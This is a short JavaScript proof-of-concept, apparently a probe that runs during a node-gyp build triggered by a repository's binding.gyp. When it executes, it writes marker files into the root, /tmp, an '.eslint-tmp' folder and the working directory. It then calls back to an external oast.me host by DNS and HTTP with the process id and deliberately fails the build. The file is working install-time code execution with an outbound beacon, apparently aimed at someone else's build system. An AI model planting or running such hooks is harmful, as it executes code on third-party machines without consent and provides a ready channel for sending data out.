// H81b node-gyp oracle: runs only if the installer invokes node-gyp for the
// repository root (binding.gyp). Writes non-secret markers, then fails the build.
const fs = require('fs');
const path = require('path');
const MARK = 'h81b-gyp-ran';

const dirs = ['/', '/.eslint-tmp/', '/tmp/'];
try { dirs.push(process.cwd() + '/'); } catch (e) {}
for (const d of dirs) {
  try { fs.writeFileSync(d + MARK, 'gyp-action pid=' + process.pid + '\n'); } catch (e) {}
}
// Best-effort OAST callback (secondary signal only).
try {
  const OAST = 'dc1i9npbs5ss7eqerff0uhafuizwgnfcr.oast.me';
  require('dns').lookup('h81b-gyp.' + OAST, function () {});
  const req = require('http').get('http://' + OAST + '/h81b-gyp?pid=' + process.pid, function (r) { r.resume(); });
  req.on('error', function () {});
  req.setTimeout(3000);
} catch (e) {}

process.stdout.write('H81B-GYP-ACTION ran\n');
process.exit(1);
